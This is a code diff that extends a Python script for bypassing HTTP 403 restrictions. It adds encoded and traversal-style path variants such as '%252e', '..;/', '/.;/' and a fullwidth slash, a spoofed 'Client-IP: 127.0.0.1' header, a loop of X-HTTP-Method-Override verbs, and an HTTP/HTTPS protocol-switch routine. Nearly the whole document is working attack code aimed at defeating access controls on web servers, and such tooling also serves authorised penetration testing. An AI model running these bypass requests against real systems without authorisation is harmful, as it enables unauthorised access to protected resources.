@@ -30,6 +30,7 @@ def print_response_path(url, http_code):
         color = bcolors.WARNING
     log.info(f"{color}%40s ---------> [%s]{bcolors.ENDC}", url, http_code)
 
+
 def print_response_method(url, http_code, method):
     if http_code in [403,404,500]:
         color = bcolors.FAIL
@@ -39,11 +40,16 @@ def print_response_method(url, http_code, method):
         color = bcolors.WARNING
     log.info(f"{color}%40s -----[%s]----> [%s]{bcolors.ENDC}", url, method, http_code)
 
+
 def send_http_request(url, headers={}, timeout=2.0):
     http_response   = requests.get(url, headers=headers, timeout=timeout)
     print_response_path(url, http_response.status_code)
 
+
 def bypass_with_http_method_switch(url, headers={}, timeout=2.0):
+
+    print("[+] Switching HTTP methods")
+
     # GET
     http_response   = requests.get(url, headers=headers, timeout=timeout)
     print_response_method(url, http_response.status_code, "GET")
@@ -64,11 +70,15 @@ def bypass_with_http_method_switch(url, headers={}, timeout=2.0):
     http_response   = requests.put(url, headers=headers, timeout=timeout, data={})
     print_response_method(url, http_response.status_code, "PUT")
 
-def bypass_with_path_manipulation(url):
-    head, tail = os.path.split(url.strip("/"))
 
+def bypass_with_path_manipulation(url):
+    print("[+] Changing paths")
+    
+    head, tail = os.path.split(url.strip("/"))
+    
     send_http_request(head + "/" + tail)
     send_http_request(head + "/%2e/" + tail)
+    send_http_request(head + "/%252e/" + tail)
     send_http_request(head + "/" + tail + "/")
     send_http_request(head + "/" + tail + "..;/")
     send_http_request(head + "/" + tail + "/..;/")
@@ -83,11 +93,22 @@ def bypass_with_path_manipulation(url):
     send_http_request(head + "/" + tail + "#")
     send_http_request(head + "/" + tail + "#test")
     send_http_request(head + "//" + tail + "//")
+    send_http_request(head + "/" + tail + "//")
+    send_http_request(head + "/./" + tail)
+    send_http_request(head + "/;/" + tail)
+    send_http_request(head + "/.;/" + tail)
+    send_http_request(head + "//.;//" + tail)
     send_http_request(head + "/" + tail + "/.")
+    send_http_request(head + "/" + tail + "/..")
     send_http_request(head + "/./" + tail + "/./")
+    send_http_request(head + "/" + tail + ".json")
+    send_http_request(head + "\\..\\.\\" + tail)
+    send_http_request(head + "/%ef%bc%8f" + tail)
+    send_http_request(head + "/" + tail.upper())
 
 
 def bypass_with_http_headers_add(url, headers={}, timeout=2.0):
+    print("[+] Trying few headers")
     head, tail = os.path.split(url.strip("/"))
 
     headers1 = {"X-Original-URL": "/"+tail}
@@ -134,6 +155,29 @@ def bypass_with_http_headers_add(url, headers={}, timeout=2.0):
     http_response   = requests.post(url, headers=headers11, timeout=timeout)
     print_response_method(url, http_response.status_code, "Header 11")
 
+    headers12 = {"Client-IP": "127.0.0.1"}
+    http_response   = requests.get(url, headers=headers12, timeout=timeout)
+    print_response_method(url, http_response.status_code, "Header 12")
+
+    for index,verb in enumerate(["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH", "INVENTED", "HACK"]):
+        headers = {"X-HTTP-Method-Override": verb}
+        http_response   = requests.get(url, headers=headers, timeout=timeout)
+        print_response_method(url, http_response.status_code, "Header " + str(12 + 1 + index))
+
+
+def bypass_with_protocole_switch(url, headers={}, timeout=2.0):
+    print("[+] Switching protocole")
+    
+    if url.startswith("https://"):
+        http_response   = requests.get(url.replace("https://", "http://"), timeout=timeout)
+        print_response_method(url, http_response.status_code, "HTTP")
+    elif url.startswith("http://"):
+        http_response   = requests.get(url.replace("http://", "https://"), timeout=timeout)
+        print_response_method(url, http_response.status_code, "HTTPS")
+    else:
+        pass
+    
+
 
 if __name__ == '__main__':
     if len(sys.argv) != 2:
@@ -148,8 +192,12 @@ if __name__ == '__main__':
     # Switching method tests
     print("\n")
     bypass_with_http_method_switch(url)
-    log.info("Change GET --> TRACE method manually !")
+    log.info("                         Change GET --> TRACE method manually !")
 
     # Adding header method tests
     print("\n")
     bypass_with_http_headers_add(url)
+
+    # Switching protocole
+    print("\n")
+    bypass_with_protocole_switch(url)
